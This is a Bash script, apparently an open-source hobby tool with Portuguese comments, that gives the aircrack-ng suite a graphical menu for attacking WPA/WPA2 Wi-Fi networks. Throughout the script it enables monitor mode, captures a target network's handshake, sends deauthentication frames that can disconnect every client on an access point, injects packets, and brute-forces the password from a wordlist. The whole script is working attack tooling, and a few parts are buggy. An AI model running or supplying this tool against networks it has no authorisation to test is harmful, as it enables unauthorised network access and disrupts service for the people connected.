#!/bin/bash

TITLE="King Size Cracking WPA/WPA2"
DATE=$(date +'%d-%m-%Y-%H-%M')	
AUTHOR="Joao Lucas <joaolucas@linuxmail.org>"
VERSION="0.1"
LICENSE="GPL"
OUTPUT="Capturas"
INTERFACE="wlp1s0"
INTERFACE_MON="wlp1s0mon"
WORD_LIST="/usr/share/wordlists/fern-wifi/common.txt"

function_verificar_usuario(){
	if [ `id -u` != "0" ] 
	then
		yad --title="$TITLE" \
		--text="Execute o script como root!" \
		--image error \
		--image-on-top \
		--timeout=5 \
		--timeout-indicador=button \
		--button gtk-ok \
		--center
		exit 1	
	fi
}

function_verificar_diretorio(){
	if [ ! -d "$OUTPUT" ]
	then
		mkdir $OUTPUT
	
	fi		
}

function_verificar_dependencias(){
	if ! hash yad 2> /dev/null
	then
		echo "[ FALHA ] yad dialog nao instalado!"
		exit 1
	fi

	if ! hash aircrack-ng 2>/dev/null
	then
		echo "[ FALHA ] aircrack-ng nao instalado!"
		exit 1
	fi
	
	if ! hash xfce4-terminal 2> /dev/null
	then
		echo "[ FALHA ] xfce4-terminal nao instalado!"
		exit 1	
	fi	
}

function_about(){
	yad --text="$TITLE \nversao $VERSION \n\nCracking WPA/WPA2 utilizando suite aircrack-ng e yad dialog \n\nSoftware sob a licenca GNU GPL versao 3 \nCodigo fonte disponivel no Github \n<https://github.com/joao-lucas/kingsizecracking> \n\nAuthor: $AUTHOR" \
		--text-align=center \
                --image gtk-about \
                --image-on-top \
                --button gtk-close \
                --no-markup \
                --undecorated \
                --buttons-layout="center" \
		--center &
}


function_modo_monitoramento(){
	airmon-ng start $INTERFACE | yad --title "$TITLE" \
	--text-info \
	--maximized \
	--button gtk-ok	
}

function_escanear_todas_redes(){
	#airodump-ng $INTERFACE_MON | yad --title "$TITLE" \
	#--text-info \
	#--text="Anote ESSID, BSSID e CHANNEL" \
	#--maximized \
	#--button gtk-ok
	xfce4-terminal -e "airodump-ng $INTERFACE_MON" & 
}

function_setar_parametros(){
	PARAMETROS=$(yad --title "$TITLE" \
	--form \
	--center \
	--field "BSSID" "" \
	--field "ESSID" "" \
	--field "Channel" "" \
	--field "Interface Mon" "wlp1s0mon" \
	--field "Salvar em" "$DATE.cap" \
	#--field "[ Wordlist ]":BTN "yad --file --maximized" \
	#--field "[ Salvar na pasta ]":BTN "yad --title $TITLE --maximized --file --directory" \
	--button gtk-cancel \
	--button gtk-ok & )
	
	BSSID=$(echo "$PARAMETROS" | cut -d '|' -f 1)
	ESSID=$(echo "$PARAMETROS" | cut -d '|' -f 2)
	CHANNEL=$(echo "$PARAMETROS" | cut -d '|' -f 3)
	INTERFACE_MON=$(echo "$PARAMETROS" | cut -d '|' -f 4)	
	#DIR=$(echo "$PARAMETROS" | cut -d '|' -f 5)
	ARQ=$(echo "$PARAMETROS" | cut -d '|' -f 5)
}

function_escanear_uma_rede(){

if [ -z $BSSID ] || [ -z $ESSID ] || [ -z $CHANNEL ] || [ -z $INTERFACE_MON ] || [ -z $ARQ ]
then
		yad --text="Voce deve setar os parametros para fazer o escaneamento!" \
		--text-align=center \
                --image gtk-error \
                --image-on-top \
                --button gtk-close \
                --no-markup \
                --undecorated \
                --buttons-layout="center" \
		--center
		
		function_menu	
fi

#airodump-ng --bssid $BSSID --essid $ESSID --channel $CHANNEL \
#	--write $OUTPUT/$ARQ $INTERFACE_MON | yad --title "$TITLE" \
#	--text-info \
#	--image find \
#	--image-on-top \
#	--maximized \
#	--button gtk-ok

	xfce4-terminal -e "airodump-ng --bssid $BSSID --essid $ESSID --channel $CHANNEL --write $OUTPUT/$ARQ $INTERFACE_MON" &
	function_menu

}


function_deauth(){
	aireplay-ng -0 1 -a $BSSID $INTERFACE_MON | yad --title $TITLE \
	--text-info \
	--maximized \
	--button-ok 

       	# -0 significa desautenticacao
	# 1 eh o numero de deauths para eviar; 0 significa envia-los continuamente
	# -a $BSSID eh o endereco MAC do AP
	# -c $CLIENT eh o endereco MAC do cliente a ser desautenticado; Se isso for omitido, todos os clientes serao desautenticados	
	# $INTERFACE eh o nome da interface
			
		#aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $INTERFACE_MON

}

function_injetar(){
	aireplay-ng --interactive 1000 -c $CLIENTE $INTERFACE_MON | yad --title $TITLE \
	--text-info \
	--maximized \
	--button gtk-ok \
        --buttons-layout="center"
} 

function_quebrar(){
	if [ ! -e $WORD_LIST ]; then
	      	yad --text="Voce deve setar uma Wordlist!" \
		--text-align=center \
                --image gtk-error \
                --image-on-top \
                --button gtk-close \
                --undecorated \
                --buttons-layout="center" \
		--center
	fi	

        aircrack-ng -w $WORD_LIST $ARQ | yad --title $TITLE \
	--text-info \
	--maximized \
	--button gtk-ok \
        --buttons-layout="center"
}

function_encerrar_todos_processos(){
	airmon-ng stop $INTERFACE_MON &> /dev/null
	killall aireplay-ng &> /dev/null
	
}

function_menu(){
	while true
	do
		MENU=$(yad --title "$TITLE" \
			--list \
			--text="King Size Cracking WPA/WPA2 \n$DATE \n\nAuthor: $AUTHOR" \
			--column=" :IMG" \
			--column="Opcao" \
			--column="Descricao" \
			--image emblem-debian \
			--image-on-top \
			--maximized \
			--no-buttons \
			find "Monitor" "Ativar modo monitoramento" \
			find "Escanear" "Escanear todas redes alcancadas" \
			img "Setar" "Parametros para o ataque" \
			find "Escanear uma rede" "Escanear apenas uma rede especifica" \
			emblem-debian "Deauth" "Fazer desautenticacao dos hosts no AP" \
			emblem-debian "Injetar" "Injetar pacotes no AP" \
			emblem-debian "Quebrar" "Tentar quebrar a senha com forca bruta" \
			gtk-about "Sobre" "Informacoes sobre o script" \
			gtk-quit "Sair" "Sair do script")

		MENU=$(echo "$MENU" | cut -d "|" -f2)

		case "$MENU" in
		"Monitor") function_modo_monitoramento ;;
		"Escanear") function_escanear_todas_redes ;;
		"Setar") function_setar_parametros ;;
		"Escanear uma rede") function_escanear_uma_rede ;;
		"Deauth") function_deauth ;;
		"Injetar") function_injetar ;;
		"Quebrar") function_quebrar ;; 
		"Sobre") function_about ;;
		"Sair") function_encerrar_todos_processos; exit 0 ;;
	esac
done
}

function_verificar_dependencias
function_verificar_usuario
function_verificar_diretorio
function_menu
